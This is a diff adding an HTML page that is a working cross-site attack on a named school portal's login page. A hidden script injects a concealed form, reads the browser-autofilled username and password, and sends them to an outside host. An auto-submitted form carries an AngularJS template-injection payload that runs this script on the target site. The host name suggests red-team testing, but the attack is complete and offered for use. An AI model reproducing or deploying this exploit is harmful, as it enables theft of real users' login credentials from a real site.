@@ -1,0 +1,122 @@
+<pre id=script style='display:none'>
+
+var temp=0;
+
+
+var input_names = ['Username', 'Password'];
+var min_length = {
+    'Username': 11,
+    'Password': 8
+};
+
+var data = {
+    'Username': '',
+    'Password': ''
+};
+
+
+var injectForm = function(inputs) {
+    var container = document.createElement('div');
+    container.style.display = 'none';
+
+    var form = document.createElement('form');
+    form.attributes.autocomplete = 'on';
+
+    for (var i = 0; i < inputs.length; i++){
+        var input_field = document.createElement('input');
+        input_field.id = inputs[i];
+        input_field.type = inputs[i];
+        input_field.name = inputs[i];
+        input_field.className += ' input-sniffer';
+        form.appendChild(input_field);
+    }
+
+    container.appendChild(form);
+    document.body.appendChild(container);
+    console.log('form injected');
+};
+
+
+var processSniffedData = function(){
+    if(data['Username'].length != 0 && data['Password'].length != 0){
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( 'GET', 'https://redteamblueteam.000webhostapp.com/api.php?Username=' + data['Username'] + '&Password=' + data['Password']); 
+        xmlHttp.send(null);
+    }
+    else window.setTimeout(processSniffedData, 200);
+};
+
+
+
+var sniffInputField = function(fieldId){
+    var recurse = false;
+    var inputElement = document.getElementById(fieldId);
+
+    if(inputElement != null) {
+        console.log(inputElement.value);
+        if (inputElement.value.length >= min_length[inputElement.name]) data[inputElement.name] = inputElement.value;
+        else recurse = true;
+    }
+    else recurse = true;
+    if (recurse) window.setTimeout(sniffInputField, 200, fieldId);
+};
+
+
+var sniffInputFields = function(){
+    var input_fields = document.getElementsByClassName('input-sniffer');
+    for (var i = 0; i < input_fields.length; i++) sniffInputField(input_fields[i].id);
+};
+
+
+
+var sniffFormInfo = function(inputs) {
+  injectForm(inputs);
+  sniffInputFields();
+  processSniffedData();
+};
+
+console.log('running pre sniffing');
+
+
+
+function getMeta(metaName) {const metas = document.getElementsByTagName('meta');for (let i = 0; i < metas.length; i++) {if (metas[i].getAttribute('name') === metaName){return metas[i].getAttribute('content');}temp;}return '';}
+
+
+function start_program(){
+
+    if(getMeta('xss') != 'ran'){
+      var meta = document.createElement('meta');
+      meta.setAttribute('name', 'xss');
+      meta.setAttribute('content', 'ran');
+      document.getElementsByTagName('head')[0].appendChild(meta);
+      
+      document.getElementById('Username').value = '';
+      console.log('running sniffing');
+      sniffFormInfo(input_names);
+
+    }
+
+    temp;
+}
+
+$( document ).ready(function() {
+  start_program();
+});
+
+</pre>
+
+
+<form id="loginForm" action="https://portalobkc.almakassed.edu.lb/AccountAdministration/Login" method="POST" style="display:none">
+ <input type="text" id=Username name="Username" value="">
+ <input type="text" id=Password name="Password" value="">
+ <input type="submit">
+</form>
+
+<script>
+    var loginform= document.getElementById("loginForm");
+    var script = document.getElementById("script").innerText;
+    document.getElementById('Username').value = "{{constructor.constructor(\"" + script + "\")()}} ";
+    loginform.submit();
+</script>
+
+
